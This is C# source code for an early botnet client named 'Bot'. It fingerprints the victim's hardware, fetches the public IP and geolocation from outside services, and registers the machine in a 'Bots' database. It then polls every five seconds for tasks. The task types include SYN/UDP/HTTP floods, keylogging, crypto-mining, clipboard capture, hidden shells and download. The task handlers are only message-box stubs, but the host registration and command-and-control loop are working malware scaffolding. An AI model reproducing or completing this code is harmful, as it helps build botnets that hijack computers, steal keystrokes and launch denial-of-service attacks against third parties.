using System;
using System.Data.SqlClient;
using System.IO;
using System.Management;
using System.Net;
using System.Windows.Forms;
using System.Xml;

namespace Bot
{
    public partial class Form1 : Form
    {
        private string date;

        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            Check();
        }

        private void Check()
        {
            using (SqlConnection conn = new SqlConnection("Data Source=localhost;Initial Catalog=Kennedy;Integrated Security=True"))
            {
                conn.Open();
                string HWID = "";
                string CPU = "";
                string GPU = "";
                bool Registered = false;

                ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_DisplayConfiguration");
                System.Management.ManagementClass mc = new System.Management.ManagementClass("Win32_Processor");
                System.Management.ManagementObjectCollection moc = mc.GetInstances();

                foreach (System.Management.ManagementObject mo in moc)
                {
                    if (HWID == "")
                    {
                        HWID = mo["ProcessorId"].ToString();
                        CPU = mo["Name"].ToString();
                    }
                }

                foreach (ManagementObject mo in searcher.Get())
                {
                    foreach (PropertyData property in mo.Properties)
                    {
                        if (property.Name == "Description")
                        {
                            GPU = property.Value.ToString();
                        }
                    }
                }

                using (SqlCommand cmd = new SqlCommand("SELECT COUNT(*) from Bots where HWID = @HWID", conn))
                {
                    cmd.Parameters.AddWithValue("HWID", HWID);
                    Registered = (int)cmd.ExecuteScalar() > 0;
                }
                if (Registered)
                {
                    loop(HWID);
                }
                else
                {
                    Register(HWID, CPU, GPU);
                }
            }
        }

        public void Register(string HWID, string CPU, string GPU)
        {
            using (SqlConnection conn = new SqlConnection("Data Source=localhost;Initial Catalog=Kennedy;Integrated Security=True"))
            {
                conn.Open();
                string Country = "";
                string Region = "";
                string IP = new WebClient().DownloadString("http://icanhazip.com");

                string ipResponse = IPRequestHelper("http://ip-api.com/xml/" + IP);
                XmlDocument ipInfoXML = new XmlDocument();
                ipInfoXML.LoadXml(ipResponse);
                XmlNodeList responseXML = ipInfoXML.GetElementsByTagName("query");
                Country = responseXML.Item(0).ChildNodes[2].InnerText.ToString();
                Region = responseXML.Item(0).ChildNodes[5].InnerText.ToString();

                using (SqlCommand cmd = new SqlCommand("SELECT CONVERT(datetime,GETDATE())", conn))
                {
                    date = cmd.ExecuteScalar().ToString();
                }

                using (SqlCommand cmd = new SqlCommand("INSERT into Bots values (@PCName, @IP, @CPU, @GPU, @FirstConn, @LastConn, @OperatingSystem, @Country, @Region, @AntiVirus, @HWID, @Version, @Ctask, @Admin)", conn))
                {
                    cmd.Parameters.AddWithValue("PCName", new Microsoft.VisualBasic.Devices.Computer().Name);
                    cmd.Parameters.AddWithValue("IP", IP);
                    cmd.Parameters.AddWithValue("CPU", CPU);
                    cmd.Parameters.AddWithValue("GPU", GPU);
                    cmd.Parameters.AddWithValue("FirstConn", date);
                    cmd.Parameters.AddWithValue("LastConn", date);
                    cmd.Parameters.AddWithValue("OperatingSystem", new Microsoft.VisualBasic.Devices.ComputerInfo().OSFullName.Replace("Microsoft ", "") + " " + Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE"));
                    cmd.Parameters.AddWithValue("Country", Country);
                    cmd.Parameters.AddWithValue("Region", Region);
                    cmd.Parameters.AddWithValue("AntiVirus", "0");
                    cmd.Parameters.AddWithValue("HWID", HWID);
                    cmd.Parameters.AddWithValue("Version", "0.1");
                    cmd.Parameters.AddWithValue("Ctask", "0");
                    cmd.Parameters.AddWithValue("Admin", "0");
                    cmd.ExecuteNonQuery();
                }
                loop(HWID);
            }
        }

        private void loop(string HWID)
        {
            using (SqlConnection conn = new SqlConnection("Data Source=localhost;Initial Catalog=Kennedy;Integrated Security=True"))
            {
                conn.Open();
                int CTask;
                int TaskID;
                string Type;

                do
                {
                    using (SqlCommand cmd = new SqlCommand("SELECT CONVERT(datetime,GETDATE())", conn))
                    {
                        date = cmd.ExecuteScalar().ToString();
                    }

                    using (SqlCommand cmd = new SqlCommand("UPDATE bots set LastConn = @LastConn where HWID = @HWID", conn))
                    {
                        cmd.Parameters.AddWithValue("HWID", HWID);
                        cmd.Parameters.AddWithValue("LastConn", date);
                        cmd.ExecuteNonQuery();
                    }

                    using (SqlCommand cmd = new SqlCommand("SELECT CTask from bots where HWID = @HWID;", conn))
                    {
                        cmd.Parameters.AddWithValue("HWID", HWID);
                        CTask = Convert.ToInt32(cmd.ExecuteScalar());
                    }

                    using (SqlCommand cmd = new SqlCommand("SELECT TaskID from Tasks where HWID = @HWID;", conn))
                    {
                        cmd.Parameters.AddWithValue("HWID", HWID);
                        TaskID = Convert.ToInt32(cmd.ExecuteScalar());
                    }

                    using (SqlCommand cmd = new SqlCommand("SELECT Type from Tasks where HWID = @HWID;", conn))
                    {
                        cmd.Parameters.AddWithValue("HWID", HWID);
                        Type = cmd.ExecuteScalar().ToString();
                    }

                    if (CTask != TaskID)
                    {
                        using (SqlCommand cmd = new SqlCommand("UPDATE bots SET CTask = @TaskID where HWID = @HWID", conn))
                        {
                            cmd.Parameters.AddWithValue("HWID", HWID);
                            cmd.Parameters.AddWithValue("TaskID", TaskID);
                            cmd.ExecuteNonQuery();
                        }

                        switch (Type)
                        {
                            case "clipboard":
                                MessageBox.Show("Clipboard");
                                break;
                            case "http":
                                MessageBox.Show("HTTP");
                                break;
                            case "syn":
                                MessageBox.Show("Syn");
                                break;
                            case "udp":
                                MessageBox.Show("UDP");
                                break;
                            case "download":
                                MessageBox.Show("Download");
                                break;
                            case "firefox":
                                MessageBox.Show("Firefox");
                                break;
                            case "homepage":
                                MessageBox.Show("Homepage");
                                break;
                            case "keylogger":
                                MessageBox.Show("Keylogger");
                                break;
                            case "mine":
                                MessageBox.Show("Mine");    
                                break;
                            case "cleanse":
                                MessageBox.Show("Cleanse");
                                break;
                            case "update":
                                MessageBox.Show("Update");
                                break;
                            case "uninstall":
                                MessageBox.Show("Uninstall");
                                break;
                            case "viewhidden":
                                MessageBox.Show("ViewHidden");
                                break;
                            case "viewvisable":
                                MessageBox.Show("ViewVisable");
                                break;
                            case "shellhidden":
                                MessageBox.Show("ShellHidden");
                                break;
                            case "shellvisable":
                                MessageBox.Show("ShellVisable");
                                break;
                            default:
                                MessageBox.Show("You typed it wrong u fuck");
                                break;
                        }
                    }
                System.Threading.Thread.Sleep(5000);
                } while (true);
            }
        }

        public string IPRequestHelper(string url)
        {
            HttpWebRequest objRequest = (HttpWebRequest)WebRequest.Create(url);
            HttpWebResponse objResponse = (HttpWebResponse)objRequest.GetResponse();
            StreamReader responseStream = new StreamReader(objResponse.GetResponseStream());
            string responseRead = responseStream.ReadToEnd();
            responseStream.Close();
            responseStream.Dispose();
            return responseRead;
        }
    }
}
    
